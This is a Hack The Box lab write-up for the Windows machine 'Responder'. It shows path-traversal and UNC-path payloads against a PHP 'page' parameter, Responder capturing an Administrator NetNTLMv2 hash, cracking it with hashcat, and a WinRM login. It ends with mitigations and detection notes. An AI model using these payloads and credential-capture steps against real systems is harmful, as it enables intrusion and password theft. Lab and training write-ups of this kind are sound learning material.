---
machine: Responder
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, lfi, ntlm, winrm, tier1]
---

# Responder — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Windows · Very Easy

## TL;DR

`unika.htb` includes local files through `?page=`, and it also accepts UNC paths. Pointing `page` at an SMB share we control makes the server authenticate to us, and **Responder** captures `Administrator`'s NetNTLMv2 hash. Crack it offline (`badminton`), log in over **WinRM (5985/tcp)** and read the flag.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.52 ((Win64) PHP/8.1.1)
5985/tcp open  http      Microsoft HTTPAPI httpd 2.0 (WinRM)
```

- **80/tcp** running PHP on Windows with the `unika.htb` vhost.
- **5985/tcp** WinRM, the remote access used at the end.
- No SMB exposed: during the capture phase the target is the client.

```bash
echo "<TARGET_IP>    unika.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The site has a language selector that loads `?page=french.html`:

```bash
curl -s "http://unika.htb/index.php?page=french.html" | head
```

Confirm the LFI with a system file:

```bash
curl -s "http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts"
```

Then check whether it also accepts remote resources (RFI), which on PHP depends on `allow_url_include` and the SMB wrapper on Windows:

```bash
curl -s "http://unika.htb/index.php?page=//<ATTACKER_IP>/somefile"
```

- The UNC path makes the web process authenticate over SMB to the attacker.
- Windows sends the NetNTLMv2 hash of the account running the service (`Administrator`).

## Foothold

```bash
sudo responder -I tun0 -v
```

Repeat the UNC request and Responder logs:

```text
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<...>
```

Offline cracking:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
```

Result: `badminton`.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p '<PASSWORD>'
cat C:\Users\Administrator\Desktop\flag.txt
```

## Lateral movement

- The hash belongs to the local Administrator of this same host.
- WinRM provides remote administration; there is no second machine in the chain.

## Privilege escalation

- Not applicable: you land as `Administrator` directly.
- Had it been a service account, the next step would have been `SeImpersonate`/`SeAssignPrimaryToken`.

## Evidence

- Responder capture with the hash redacted.
- WinRM session and the flag redacted.
- No real hashes or passwords in the repository.

## Lessons learned

- An LFI becomes a credential leak when the language allows remote wrappers.
- Windows authenticates automatically to UNC resources: that is the basis of coercion attacks.
- A NetNTLMv2 hash is not "passed" as-is: it is cracked offline or relayed when SMB signing is off.
- Responder must listen on the VPN interface, not on `eth0`.

## Mitigations and detection

**How to fix it:**

- Never build paths from user input: whitelist allowed files.
- `allow_url_include=Off` and `allow_url_fopen=Off`.
- Disable the server's outbound SMB client or block 445 to the internet.
- Least-privilege service accounts with strong passwords; enforce SMB signing.

**How it would be detected:**

- Outbound SMB connections from web servers (5140/4624 type 3 at the destination).
- NTLM authentication attempts against external IPs.
- WinRM logins (91/4624) from unusual addresses.

- CWE-98: Improper Control of Filename for Include
- CWE-522: Insufficiently Protected Credentials
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1557.001](https://attack.mitre.org/techniques/T1557/001/), [T1110.002](https://attack.mitre.org/techniques/T1110/002/)

## References

- [Responder (lgandx)](https://github.com/lgandx/Responder)
- [Hashcat — mode 5600 NetNTLMv2](https://hashcat.net/wiki/doku.php?id=example_hashes)
